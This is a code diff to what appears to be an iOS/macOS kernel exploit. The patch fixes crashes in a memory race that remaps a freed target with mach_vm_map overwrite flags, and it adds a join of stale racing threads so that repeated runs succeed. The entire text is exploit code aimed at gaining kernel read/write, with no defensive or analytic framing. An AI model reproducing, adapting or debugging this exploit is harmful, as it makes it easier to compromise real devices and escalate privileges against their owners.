@@ -132,18 +132,22 @@ static void s_surface_mlock(mach_vm_address_t addr, mach_vm_size_t size) {
 }
 
 static void *s_free_thread_worker(void *arg) {
+    /* 2026-11-24 fix (the 4-of-5 deterministic double-tap SIGSEGVs): use OUR
+       OWN arg, never the global s_ctx.shared — a second tap memsets s_ctx and
+       a stale worker (early-exit paths skip the join) then derefs NULL->0x30. */
+    free_thread_shared_t *shared = (free_thread_shared_t *)arg;
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
-    while (atomic_load_explicit(&s_ctx.shared->free_thread_start, memory_order_seq_cst) == 0);
-    mach_vm_address_t free_target = atomic_load_explicit(&s_ctx.shared->free_target_sync, memory_order_seq_cst);
-    mach_vm_size_t free_target_size = atomic_load_explicit(&s_ctx.shared->free_target_size_sync, memory_order_seq_cst);
-    while (atomic_load_explicit(&s_ctx.shared->go_sync, memory_order_seq_cst) == 0);
-    while (atomic_load_explicit(&s_ctx.shared->go_sync, memory_order_seq_cst) != 0) {
-        while (atomic_load_explicit(&s_ctx.shared->race_sync, memory_order_seq_cst) == 0);
-        mach_port_t target_obj = (mach_port_t)atomic_load_explicit(&s_ctx.shared->target_object_sync, memory_order_seq_cst);
-        mach_vm_offset_t target_off = atomic_load_explicit(&s_ctx.shared->target_object_offset_sync, memory_order_seq_cst);
+    while (atomic_load_explicit(&shared->free_thread_start, memory_order_seq_cst) == 0);
+    mach_vm_address_t free_target = atomic_load_explicit(&shared->free_target_sync, memory_order_seq_cst);
+    mach_vm_size_t free_target_size = atomic_load_explicit(&shared->free_target_size_sync, memory_order_seq_cst);
+    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) == 0);
+    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) != 0) {
+        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 0);
+        mach_port_t target_obj = (mach_port_t)atomic_load_explicit(&shared->target_object_sync, memory_order_seq_cst);
+        mach_vm_offset_t target_off = atomic_load_explicit(&shared->target_object_offset_sync, memory_order_seq_cst);
         mach_vm_address_t target_addr = free_target;
         mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_obj, target_off, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
-        atomic_store_explicit(&s_ctx.shared->race_sync, 0, memory_order_seq_cst);
+        atomic_store_explicit(&shared->race_sync, 0, memory_order_seq_cst);
     }
     return NULL;
 }
@@ -390,6 +394,17 @@ static int s_clearsword_run(void) {
     setrlimit(RLIMIT_NOFILE, &rl);
     krw_log("[+] FD limit raised to 0x10000");
 
+    /* 2026-11-24: stop+join any stale worker from a previous tap BEFORE the
+       memset (its early-exit paths skip the teardown join — the deterministic
+       0x30/0x4000 SIGSEGV class on double-taps). */
+    if (s_ctx.free_thread) {
+        if (s_ctx.shared) {
+            atomic_store_explicit(&s_ctx.shared->race_sync, 1, memory_order_seq_cst);
+            atomic_store_explicit(&s_ctx.shared->go_sync, 0, memory_order_seq_cst);
+        }
+        pthread_join(s_ctx.free_thread, NULL);
+        s_ctx.free_thread = 0;
+    }
     memset(&s_ctx, 0, sizeof(s_ctx));
     s_ctx.target_file_size = 0x8000;
     s_ctx.oob_offset = 0x100;
